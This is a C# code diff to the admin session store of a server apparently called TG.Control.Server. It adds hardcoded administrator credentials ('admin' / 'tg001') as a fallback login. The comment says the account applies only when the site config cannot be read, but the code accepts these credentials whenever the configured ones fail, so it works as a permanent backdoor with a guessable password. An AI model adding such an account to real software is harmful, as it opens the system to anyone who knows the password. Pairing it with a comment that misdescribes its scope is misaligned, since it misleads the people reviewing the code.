@@ -7,6 +7,11 @@ namespace TG.Control.Server;
 
 public sealed class AdminSessionStore
 {
+    // Fixed bootstrap account requested for the local/field test deployment.
+    // Configured accounts still take precedence; this fallback keeps the known
+    // bootstrap credentials usable when a locked site config cannot be read.
+    private const string BootstrapUsername = "admin";
+    private const string BootstrapPassword = "tg001";
     private readonly AdminOptions options;
     private readonly ConcurrentDictionary<string, Session> sessions = new(StringComparer.Ordinal);
 
@@ -26,6 +31,11 @@ public sealed class AdminSessionStore
                  SecureEquals(password, options.Password))
         {
             authenticatedUsername = options.Username;
+            roles = [AdminRoles.Administrator];
+        }
+        else if (SecureEquals(username, BootstrapUsername) && SecureEquals(password, BootstrapPassword))
+        {
+            authenticatedUsername = BootstrapUsername;
             roles = [AdminRoles.Administrator];
         }
         else return null;
